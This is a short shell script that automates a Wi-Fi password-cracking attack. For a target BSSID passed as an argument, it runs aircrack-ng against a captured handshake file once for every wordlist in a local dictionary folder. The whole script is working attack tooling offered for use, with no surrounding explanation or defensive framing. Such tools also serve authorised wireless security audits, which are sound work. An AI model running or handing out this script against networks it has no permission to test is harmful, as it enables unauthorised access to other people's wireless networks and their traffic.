#!/bin/sh
dictionary_dir="dictionary"
target_BSSID=$1
real_file_name="$2-01"
echo "target_BSSID: $target_BSSID"
echo "real_file_name: $real_file_name"

for wordlist in ./$dictionary_dir/*; do
    aircrack-ng -w $wordlist -b $target_BSSID ./log/$real_file_name.cap
done
read -n 1 -s -r -p "any key to quit"
